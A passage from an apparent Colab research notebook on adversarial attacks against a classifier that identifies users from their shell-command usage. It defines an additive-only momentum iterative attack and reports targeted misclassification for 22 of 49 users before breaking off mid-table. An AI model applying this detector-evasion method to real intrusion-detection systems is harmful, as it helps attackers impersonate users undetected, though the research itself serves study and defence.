NNjn//L77RwJSd3thzNdCraCjnISaUFwPlXaQFQrlIaMYQWAKnYHgSgFKVs\nD2p5B6AYKi0APNMCoByVQjbehBYAKi0AylFKI4bQAuD8a3l3PBOU52w4nqlZZ/popnNdKduDZTx5\nA4DYHgQgnmkBUJC2QjbehBYAKi0AyiG0ACiGD4EEoBilVFplPHkDgKi0AEg5v1wstAA4/45xAqBc\nbZUynhYJLQCKacQQWgAUsz1YRj0IABFaAOQX3YNzfZ3M8PBwNm3alP7+/jz77LPHHfPggw/mIx/5\nyEnnsj0IQMu2B8fHxzM5OZmRkZFMTExkYGAgIyMjx4zZu3dvdu7cmYULF550PpUWAC2rtMbGxtLb\n25sk6e7uzsGDBzMzM3PMmM2bN+fOO+9sbp1z+/EAOJdUKm1zfjVSq9WyYsWK2evOzs5MT0/PXo+O\njuaqq67KJZdc0tQ6hRYAqbyDP6eiXq/Pfv3aa69ldHQ0H/vYx5p+v2daALTsGKdqtZparTZ7PTU1\nla6uriTJ008/nQMHDuTmm2/O66+/npdeeinDw8MZGBg44XxCi/PWzumnmhr3/q4PtOT7X3pvX9Nj\nX77nuy1Zw1/864n/4/BWf7thuCXfn3NfT09Ptm7dmv7+/uzZsyfVajUdHR1Jko0bN2bjxo1Jkn37\n9uVzn/tcw8BKhBYAad2JGOvXr8/atWvT39+fSqWSwcHBjI6OZtmyZenra/5/3H5FaAHQ0g+BvPvu\nu4+5XrNmzdvGrFy5Mt/85jdPOpfQAsDZgwCU42St62cLoQVAS7cH55PQAqCY7cEy6kEAiEoLgJTz\neVpCC4BitgeFFgDFNGJU6m89vfA3HHnz0OlcCwANLG5f2rK5RyZO/ou9J7Kp++Qf3jhfVFoAeKYF\nQDlKeaal5R2AYqi0ALA9CEA5StkeFFoAFNPyLrQAUGkBUI5KIX15QguAYiqtMqIVAKLSOiOW3PR7\nTY89vO3fmx77xCuPNz32Dy/Z2PRY4Nyn5R2AYrQVsj0otABQaQFQjlIaMYQWAFreAShHKZVWGdEK\nAFFpARBnDwJQkFK2B4UWAFreASiHSosTOpWjmf7rf15oeuyZPpppyZ/+btNjDz/2Hy1cSRl+9sZr\nTY/9rYXvauFKQMs7AAUp5RinMqIVAKLSAiAaMQAoiEYMAIqh0gKgGCotAIrRVkhfntACoJhKq4xo\nBYCotACIRgzmyW8vW32ml9A0RzOdGkczcTYpZXtQaAGg0gKgHEILgHLYHgSgFKVUWlreASiGSgsA\n3YMAlKOU7UGhBYDQAqAcrdweHB4ezq5du1KpVDIwMJB169bN3nv66aezZcuWtLW1ZdWqVRkaGkpb\n24nbLYQWJ/Xn//JXTY279wN3Nj3nFUM3NT12/31PNj0WmJtWVVrj4+OZnJzMyMhIJiYmMjAwkJGR\nkdn799xzT77xjW/k3e9+dz71qU/l+9//fjZs2HDC+YQWAC0LrbGxsfT29iZJuru7c/DgwczMzKSj\noyNJMjo6Ovt1Z2dnfvrTnzacT8s7AC1Tq9WyYsWK2evOzs5MT0/PXv8qsKamprJjx46GVVai0gIg\np6/lvV6vv+2v/eQnP8knP/nJDA4OHhNwxyO0AGjZ9mC1Wk2tVpu9npqaSldX1+z1zMxMPv7xj+fT\nn/50rrnmmpPOZ3sQgFQqlTm/Gunp6cn27duTJHv27Em1Wp3dEkySzZs356Mf/Wiuvfbaptap0gKg\nZZXW+vXrs3bt2vT396dSqWRwcDCjo6NZtmxZrrnmmjz22GOZnJzMo48+miS54YYbsmnTphPOJ7QA\naOkvF999993HXK9Zs2b26927d5/SXEILgGLOHvRMC4BiqLQAKObswUr9eE3zv3TkzUOncy1vs+TD\na04+6JcOf+f5Fq5kfk387D+bHtv9W7/TwpUAJVncvrRlc794cM+c3/ve5WvncSWNqbQAKOaZltAC\nIClke1BoAaDSAqAcpTRiaHkHoBgqLQCKqbSEFgCeaQFQDpUWAMUQWgAUo5TtwbP6GCcAfq2Vxzjt\n+9//nvN7V164ah5X0piWdwCKYXsQgGK2B4UWABoxACiJ0AKgEGVEltACIJ5pAVCUMkJLyzsAxVBp\nAVBInSW0AEhSSmwJLQCKacTwTAuAYqi0AHAiBgDlKCW0bA8CUAyhBUAxbA8CoHsQAOabSguAYhox\nhBYAcSIGAMUoI7I80wKgICotAIrpHhRaAKSUDUKhBUAhkSW0AEhSSmwJLQCKeaalexCAYggtAIph\nexAAxzgBUJJzILQWty89XesA4AwqI7JUWgCknO5BoQVASqm1hBYAhUSWlncACqLSAiCtrLWGh4ez\na9euVCqVDAwMZN26dbP3nnrqqWzZsiXt7e259tprc8cddzScS6UFQCqVypxfjYyPj2dycjIjIyMZ\nGhrK0NDQMffvv//+bN26Ndu2bcuOHTuyd+/ehvMJLQBaZmxsLL29vUmS7u7uHDx4MDMzM0mSl19+\nOcuXL89FF12Utra2bNiwIWNjYw3nE1oApPIO/jRSq9WyYsWK2evOzs5MT08nSaanp9PZ2Xnceyfi\nmRYAp+0wiXq9/o7er9ICoGWq1Wpqtdrs9dTUVLq6uo57b//+/alWqw3nE1oAtExPT0+2b9+eJNmz\nZ0+q1Wo6OjqSJCtXrszMzEz27duXo0eP5sknn0xPT0/D+Sr1d1qrAUADDzzwQH7wgx+kUqlkcHAw\nzz33XJYtW5a+vr7s3LkzDzzwQJLkgx/8YG677baGcwktAIphexCAYggtAIohtAAohtACoBhCC4Bi\nCC0AiiG0ACiG0AKgGP8PrKZu5ERULWkAAAAASUVORK5CYII=\n",
            "text/plain": [
              "<Figure size 576x396 with 2 Axes>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "wURvWArRb2Ws",
        "colab_type": "code",
        "outputId": "85e46a84-d8f8-4fee-a7f8-047ed58b5639",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 357
        }
      },
      "cell_type": "code",
      "source": [
        "plot_command_vector(adversarial_examples[0], danger=True)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<matplotlib.axes._subplots.AxesSubplot at 0x7fe5f86a82e8>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 58
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "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\n47tcVVBHIgAAAABJRU5ErkJggg==\n",
            "text/plain": [
              "<Figure size 576x396 with 2 Axes>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "EkFQOGwDcHvm",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "As can be seen in the two plots, the key components i.e. most used commands are left unchanged, whilst FGSM creates background noise to cause the misclassification attempt.. "
      ]
    },
    {
      "metadata": {
        "id": "ADD0NPmjVd5_",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Developing a Specialised Attack Method\n",
        "\n",
        "Most adversarial attacks are mounted against image classification networks. They aim to minimise visual difference in their generated examples. Our attack has a different set of requirements:\n",
        "\n",
        "  - The set of commands should perform an equivelant task on the target computer.\n",
        "  - We can append the script with as many commands as we like.\n",
        "  \n",
        "In the section below, we modify the Momentum Iterative Method introduced by Dong et al  (2017) to produce additive perturbations only:"
      ]
    },
    {
      "metadata": {
        "id": "4RG1Zq-uklS4",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "\n",
        "from cleverhans.attacks import optimize_linear\n",
        "from cleverhans.compat import reduce_sum, reduce_mean, softmax_cross_entropy_with_logits\n",
        "from cleverhans import utils_tf\n",
        "\n",
        "\n",
        "class AdditiveMomentumIterativeMethod(cleverhans.attacks.MomentumIterativeMethod):\n",
        "  \"\"\"\n",
        "  Modifies the The Momentum Iterative Method (Dong et al. 2017) to produce additive\n",
        "  perturbations only.\n",
        "  \n",
        "  If it finds the optimal perturbation to be negative, a random addition is performed instead.\n",
        "  \n",
        "  Original paper link: https://arxiv.org/pdf/1710.06081.pdf\n",
        "  \n",
        "  The majority of the code from this cell comes directly from the cleverhans\n",
        "  module (https://github.com/tensorflow/cleverhans/) and is licensed similarly under the MIT\n",
        "  license (https://github.com/tensorflow/cleverhans/blob/master/LICENSE).\n",
        "  \n",
        "  :param model: cleverhans.model.Model\n",
        "  :param sess: optional tf.Session\n",
        "  :param dtypestr: dtype of the data\n",
        "  :param kwargs: passed through to super constructor\n",
        "  \"\"\"\n",
        "\n",
        "  def generate(self, x, **kwargs):\n",
        "    \"\"\"\n",
        "    Generate symbolic graph for adversarial examples and return.\n",
        "    :param x: The model's symbolic inputs.\n",
        "    :param kwargs: Keyword arguments. See `parse_params` for documentation.\n",
        "    \"\"\"\n",
        "    # Parse and save attack-specific parameters\n",
        "    assert self.parse_params(**kwargs)\n",
        "\n",
        "    asserts = []\n",
        "\n",
        "    # If a data range was specified, check that the input was in that range\n",
        "    if self.clip_min is not None:\n",
        "      asserts.append(utils_tf.assert_greater_equal(x,\n",
        "                                                   tf.cast(self.clip_min,\n",
        "                                                           x.dtype)))\n",
        "\n",
        "    if self.clip_max is not None:\n",
        "      asserts.append(utils_tf.assert_less_equal(x,\n",
        "                                                tf.cast(self.clip_max,\n",
        "                                                        x.dtype)))\n",
        "\n",
        "    # Initialize loop variables\n",
        "    momentum = tf.zeros_like(x)\n",
        "    adv_x = x\n",
        "\n",
        "    # Fix labels to the first model predictions for loss computation\n",
        "    y, _nb_classes = self.get_or_guess_labels(x, kwargs)\n",
        "    y = y / reduce_sum(y, 1, keepdims=True)\n",
        "    targeted = (self.y_target is not None)\n",
        "\n",
        "    def cond(i, _, __):\n",
        "      \"\"\"Iterate until number of iterations completed\"\"\"\n",
        "      return tf.less(i, self.nb_iter)\n",
        "\n",
        "    def body(i, ax, m):\n",
        "      \"\"\"Do a momentum step\"\"\"\n",
        "      logits = self.model.get_logits(ax)\n",
        "      loss = softmax_cross_entropy_with_logits(labels=y, logits=logits)\n",
        "      if targeted:\n",
        "        loss = -loss\n",
        "\n",
        "      # Define gradient of loss wrt input\n",
        "      grad, = tf.gradients(loss, ax)\n",
        "\n",
        "      # Normalize current gradient and add it to the accumulated gradient\n",
        "      red_ind = list(range(1, len(grad.get_shape())))\n",
        "      avoid_zero_div = tf.cast(1e-12, grad.dtype)\n",
        "      grad = grad / tf.maximum(\n",
        "          avoid_zero_div,\n",
        "          reduce_mean(tf.abs(grad), red_ind, keepdims=True))\n",
        "      m = self.decay_factor * m + grad\n",
        "\n",
        "      optimal_perturbation = optimize_linear(m, self.eps_iter, self.ord)\n",
        "      optimal_perturbation = tf.maximum(optimal_perturbation, tf.zeros_like(optimal_perturbation))\n",
        "        \n",
        "      if self.ord == 1:\n",
        "        raise NotImplementedError(\"This attack hasn't been tested for ord=1.\"\n",
        "                                  \"It's not clear that FGM makes a good inner \"\n",
        "                                  \"loop step for iterative optimization since \"\n",
        "                                  \"it updates just one coordinate at a time.\")\n",
        "\n",
        "      # Update and clip adversarial example in current iteration\n",
        "      ax = ax + optimal_perturbation\n",
        "      ax = x + utils_tf.clip_eta(ax - x, self.ord, self.eps)\n",
        "\n",
        "      if self.clip_min is not None and self.clip_max is not None:\n",
        "        ax = utils_tf.clip_by_value(ax, self.clip_min, self.clip_max)\n",
        "\n",
        "      ax = tf.stop_gradient(ax)\n",
        "\n",
        "      return i + 1, ax, m\n",
        "\n",
        "    _, adv_x, _ = tf.while_loop(\n",
        "        cond, body, (tf.zeros([]), adv_x, momentum), back_prop=True,\n",
        "        maximum_iterations=self.nb_iter)\n",
        "\n",
        "    if self.sanity_checks:\n",
        "      with tf.control_dependencies(asserts):\n",
        "        adv_x = tf.identity(adv_x)\n",
        "\n",
        "    return adv_x\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "ctn1LalQnU4P",
        "colab_type": "code",
        "outputId": "56349683-34b0-4990-e6b4-866175f8b738",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1652
        }
      },
      "cell_type": "code",
      "source": [
        "ami_attack = AdditiveMomentumIterativeMethod(substitute, sess=tensorflow_session)\n",
        "ami_params = {\n",
        "    'eps': 100.0,\n",
        "    'eps_iter': 1.0,\n",
        "    'nb_iter': 100,\n",
        "    'ord': numpy.inf,\n",
        "    'clip_min': 0.0,\n",
        "    'clip_max': 100.0,\n",
        "}\n",
        "\n",
        "summary, adversarial_examples = run_targeted_attack_against_all_users(\n",
        "    adversary_test_inputs[0],\n",
        "    adversary_test_labels[0],\n",
        "    ami_attack,\n",
        "    ami_params,\n",
        ")\n",
        "summary"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[INFO 2019-03-21 16:20:31,164 cleverhans] Constructing new graph for attack AdditiveMomentumIterativeMethod\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "A targeted attack was successful against 22/49 users (with the given input):\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Original User</th>\n",
              "      <th>Target User</th>\n",
              "      <th>Oracle Prediction</th>\n",
              "      <th>Oracle Certainty</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>43</td>\n",
              "      <td>0</td>\n",
              "      <td>0</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>43</td>\n",
              "      <td>1</td>\n",
              "      <td>1</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>43</td>\n",
              "      <td>2</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>43</td>\n",
              "      <td>3</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>43</td>\n",
              "      <td>4</td>\n",
              "      <td>2</td>\n",
              "      <td>1.000000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>43</td>\n",
              "      <td>5</td>\n",
              "      <td>5</td>\n",
